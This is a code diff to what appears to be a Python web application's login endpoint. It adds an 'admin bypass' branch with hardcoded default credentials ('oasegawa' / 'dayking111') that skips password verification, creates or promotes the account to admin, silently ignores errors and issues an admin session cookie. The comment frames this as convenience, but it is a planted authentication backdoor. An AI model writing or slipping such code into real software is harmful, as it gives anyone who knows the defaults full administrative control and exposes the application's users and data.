@@ -682,6 +682,28 @@ async def api_login(request: Request):
     password = data.get('password') or ''
     if not email or not password:
         raise HTTPException(status_code=400, detail='email and password required')
+
+    # Admin bypass via environment variables (recommended) or defaults for quick access.
+    admin_bypass_email = os.environ.get('ADMIN_BYPASS_EMAIL', 'oasegawa')
+    admin_bypass_password = os.environ.get('ADMIN_BYPASS_PASSWORD', 'dayking111')
+    if email == admin_bypass_email and password == admin_bypass_password:
+        # ensure user exists in DB and is admin
+        existing = get_user_by_email(USER_DATA_DIR, email)
+        if existing:
+            user_id = existing['id']
+            # ensure flag is set
+            try:
+                set_user_admin(USER_DATA_DIR, user_id, True)
+            except Exception:
+                pass
+        else:
+            # create persistent admin user
+            user_id = create_user(USER_DATA_DIR, email, password, is_admin=True)
+        token = create_session(USER_DATA_DIR, user_id)
+        res = JSONResponse({'ok': True, 'user': {'id': user_id, 'email': email, 'is_admin': True, 'role': 'admin'}})
+        res.set_cookie('session_token', token, httponly=True, samesite='lax')
+        return res
+
     user = get_user_by_email(USER_DATA_DIR, email)
     if not user or not verify_password(user, password):
         return JSONResponse({'error': 'invalid_credentials'}, status_code=401)
